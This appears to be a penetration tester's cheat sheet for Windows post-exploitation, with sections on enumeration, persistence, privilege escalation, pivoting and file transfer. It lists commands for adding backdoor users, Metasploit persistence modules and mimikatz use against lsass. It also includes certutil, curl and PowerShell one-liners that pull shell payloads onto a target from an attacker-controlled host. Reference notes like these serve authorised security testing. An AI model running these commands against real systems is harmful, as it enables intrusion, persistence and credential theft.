<details>
  <summary></summary>
    <br>
</details>

<details>
  <summary>Enumeration</summary>
    <br>
  
 [JAWS](https://github.com/411Hall/JAWS)
  
  
    Recently accessed files and executed commands

    type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 


List of installed patches

    wmic qfe get Caption,Description,HotFixID,InstalledOn
 
 
Network connections

    netstat -r    # route info
    
    netstat -ano  # connections and the PID
    
    route print
    
    
Processes
 
     tasklist 
     powershell -c Get-Service
     sc query

Arp table

    arp -a
</details>

<details>
  <summary>Maintain persistance</summary>
    <br>
    
     - Add user
  
        net user <username> <pass> /add

  - Metasploit
  
        exploit/windows/local/persistence
        
        exploit/windows/local/registry_persistence

        run persistence -h

  - Set a scheduled task

    
</details>

<details>
  <summary>Pivilege escalation</summary>
    <br>
    
- [mimikatz](https://github.com/Kahvi-0/Tools-and-Concepts/blob/master/Windows/Mimikatz.md)

  - Need process with permissions to be able to interact with the running lsass.exe process
    -  ran as NT AUTHORITY\SYSTEM
    -  Must be same arch as the lsass.exe running on the target
    
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
    
-------------------------------------------------------------------------------------

- [Nishang repo](https://github.com/samratashok/nishang)

-------------------------------------------------------------------------------------

- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat)

      wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
      
-------------------------------------------------------------------------------------
      
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---common-vulnerabilities-and-exposure)

-------------------------------------------------------------------------------------


- [Windows exploit suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

      wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py && chmod +x windows-exploit-suggester.py && ./windows-exploit-suggester.py --update
      
      # This download and will create an .xlsx database
      
      With meterpreter "sysinfo" or CMD "systeminfo" saved to a file 
      
      ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
      
      # Without 
      
      ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext 'windows server 2008 r2'


- Meterpreter exploit suggester module

      post/multi/recon/local_exploit_suggester


-------------------------------------------------------------------------------------

[Token impersonation](https://github.com/Kahvi-0/Vulnerabilities-and-Exploitations/blob/master/Local/Token%20Impersonation.md)

</details>

<details>
  <summary>Pivoting</summary>
    <br>

**Egrees firewall testing:**

 If python is useable: 
 
    https://github.com/stufus/egresscheck-framework
    
 If python is not useable and powershell is: 
 
     powershell.exe Get-Alias -Definition Invoke-WebRequest | Format-Table -AutoSize
     
     powershell.exe curl http://<ip>:<port>/x
     
     
     
 If pwnd target has a connection to a network that we do not have a connection to, we can set up a route on the machine to forward our traffic 
 
   - Meterpreter 
   
         run autoroute -s <target network seen via enumeration>/CIDR
         
         run autoroute -p   #to confirm
         
       you can now test by pinging a device on the remote network

</details>

<details>
  <summary>Methods to upload files to/from target</summary>
    <br>

    curl http://<ip>:8000/<file> -O <file>
    
    certutil.exe -urlcache -f http://<ip>:8000/<remotefile> <save filename>
    
    powershell -c "Invoke-WebRequest -Uri '<ip>/<shell.exe>' -OutFile '<output path>'"
    
    Naviage directly through browser 
    
    ftp <ip>   #On attacker machine: python -m pyftpdlib 21  

    upload  #If using meterpreter

</details>

